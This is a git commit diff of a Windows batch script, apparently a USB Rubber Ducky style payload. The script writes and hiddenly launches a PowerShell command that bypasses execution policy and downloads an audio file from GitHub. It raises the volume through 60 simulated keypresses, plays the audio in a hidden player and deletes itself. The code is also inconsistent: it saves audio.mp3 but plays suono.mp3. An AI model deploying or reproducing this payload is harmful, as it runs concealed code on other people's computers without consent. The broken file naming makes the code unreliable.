08b8b41ad7d018adeb383a0e249b4dc4dda309a4
USB-Rubber-Ducky1 <corcialompa@morke.org>
2024-05-10 23:00:52 +0200

    Update play_audio.bat

--- executable-main/play_audio.bat
+++ executable-main/play_audio.bat
@@ -7,7 +7,7 @@ set "percorso_file=%desktop%\%nome_file%"
 
 (
     echo @echo off
-    echo powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'LINK_TO_DOWNLOAD_AUDIO' -OutFile '%desktop%\audio.mp3'; Start-Sleep -Seconds 60; for ($i=1; $i -le 60; $i++) { (New-Object -ComObject WScript.Shell).SendKeys([char]175) }; (New-Object -ComObject WScript.Shell).Run('wmplayer.exe \"%desktop%\suono.mp3\" /play /close', 0)"
+    echo powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/USB-Rubber-Ducky1/PAYLOAD/raw/main/executable-main/audio.mp3' -OutFile '%desktop%\audio.mp3'; Start-Sleep -Seconds 60; for ($i=1; $i -le 60; $i++) { (New-Object -ComObject WScript.Shell).SendKeys([char]175) }; (New-Object -ComObject WScript.Shell).Run('wmplayer.exe \"%desktop%\suono.mp3\" /play /close', 0)"
 ) > "%percorso_file%"
 powershell -Command "Start-Process -WindowStyle Hidden -FilePath '%percorso_file%'"
 del "%~f0"
